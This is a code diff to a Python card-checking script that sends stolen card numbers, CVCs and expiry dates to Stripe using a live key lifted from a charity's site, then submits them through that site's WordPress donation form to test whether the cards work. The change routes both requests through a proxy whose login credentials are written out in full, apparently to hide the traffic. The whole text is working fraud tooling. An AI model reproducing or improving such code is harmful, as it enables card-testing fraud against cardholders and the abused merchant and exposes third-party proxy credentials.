@@ -9,6 +9,11 @@ def Tele(ccx):
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
 	r = requests.session()
+
+	proxies = {
+        'http': 'http://7d165d5dd6916b4481d6:c722f19754c2d55962735c996e4b03@delta.proxi.sh:1088',
+        'https': 'http://7d165d5dd6916b4481d6:c722f19754c2d55962735c996e4b03@delta.proxi.sh:1088',
+	}
 	
 	headers = {
 	    'authority': 'api.stripe.com',
@@ -30,7 +35,7 @@ def Tele(ccx):
 	
 	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Fiuaf.org&time_on_page=161480&key=pk_live_51MXKg9EutUtc9BMhgynUEVNo2DyFY1jIakVXSH2RtvDNnKfN7PDBx0mtbTZ69CTS67ajxGJWCy5y7JqVL5fpcSzF00ZsZYMlkC'
 	
-	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxies)
 	
 	pm = r1.json()['id']
 	
@@ -84,6 +89,6 @@ def Tele(ccx):
 	    'form_id': '6',
 	}
 	
-	r2 = requests.post('https://iuaf.org/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
+	r2 = requests.post('https://iuaf.org/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data, proxies=proxies)
 	
 	return (r2.json())
